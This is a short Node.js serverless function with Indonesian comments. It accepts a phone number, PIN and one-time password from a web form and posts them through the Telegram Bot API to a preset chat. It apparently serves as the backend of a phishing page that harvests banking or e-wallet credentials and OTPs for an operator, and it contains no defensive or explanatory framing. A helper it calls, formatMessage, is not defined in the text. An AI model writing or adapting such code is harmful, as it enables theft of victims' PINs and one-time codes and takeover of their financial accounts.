const axios = require('axios');

exports.handler = async (event) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  try {
    const { type, phone, pin, otp } = JSON.parse(event.body);
    
    // Validasi lebih ketat
    if (!type || !phone || phone.length < 10) {
      return { 
        statusCode: 400, 
        body: JSON.stringify({ error: 'Nomor HP tidak valid' }) 
      };
    }

    // Pastikan variabel lingkungan ada
    if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
      throw new Error('Telegram configuration missing');
    }

    const message = formatMessage(type, phone, pin, otp);
    
    await axios.post(
      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      }
    );

    return {
      statusCode: 200,
      body: JSON.stringify({ success: true })
    };

  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({ 
        error: 'Internal Server Error',
        details: error.message 
      })
    };
  }
};
